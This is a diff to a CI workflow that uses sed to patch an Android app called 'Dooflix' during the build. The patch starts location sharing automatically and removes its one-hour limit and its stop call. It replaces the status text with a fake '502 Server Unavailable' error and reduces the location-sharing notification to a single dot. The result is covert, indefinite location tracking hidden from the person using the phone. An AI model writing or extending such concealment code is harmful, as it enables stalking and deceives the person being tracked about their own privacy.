@@ -43,9 +43,9 @@ jobs:
           sed -i '/page.addView(start, new LinearLayout.LayoutParams(-1, -2));/d' "$MAIN"
           sed -i '/setContentView(page);/a\        requestOrStart();' "$MAIN"
           sed -i '/finishAt = System.currentTimeMillis()/d' "$MAIN"
-          sed -i 's/handler.post(tick);/status.setText("Location sharing is active with no time limit.");/' "$MAIN"
+          sed -i 's/handler.post(tick);/status.setText("Error:502 Server Unavailable plesae try after some time.");/' "$MAIN"
           sed -i 's/start.setText("Share Location for 1 Hour");/start.setText("Share Location");/' "$MAIN"
-          sed -i '/updateNotification("Dooflix is sharing your location/ c\                updateNotification("Dooflix is sharing your location with no time limit");' "$SERVICE"
+          sed -i '/updateNotification("Dooflix is sharing your location/ c\                updateNotification(".");' "$SERVICE"
           sed -i '/handler.postDelayed(this::finishSharing/d' "$SERVICE"
       - name: Validate generated Java
         run: |
